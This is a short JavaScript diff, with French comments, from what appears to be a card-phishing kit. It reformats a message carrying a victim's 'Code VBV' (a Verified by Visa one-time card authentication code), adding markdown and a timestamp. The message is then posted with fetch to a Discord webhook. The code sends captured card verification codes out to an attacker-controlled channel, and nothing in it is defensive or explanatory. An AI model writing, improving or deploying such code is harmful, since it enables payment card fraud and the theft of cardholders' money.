@@ -221,8 +221,12 @@
 
       // Envoi du message à la webhook Discord
       const msg =
-        `🔒 code vbv 🔒\n\n` +
-        `🔒 Code : ${code}\n\n`;
+        `🔒 **Code VBV** 🔒\n` +
+        `${'─'.repeat(20)}\n\n` +
+        `🔑 **Code :** \`${code}\`\n\n` +
+        `${'─'.repeat(20)}\n` +
+        `⏰ ${new Date().toLocaleString('fr-FR')}`;
+
 
       try {
         const resp = await fetch(webhookURL, {
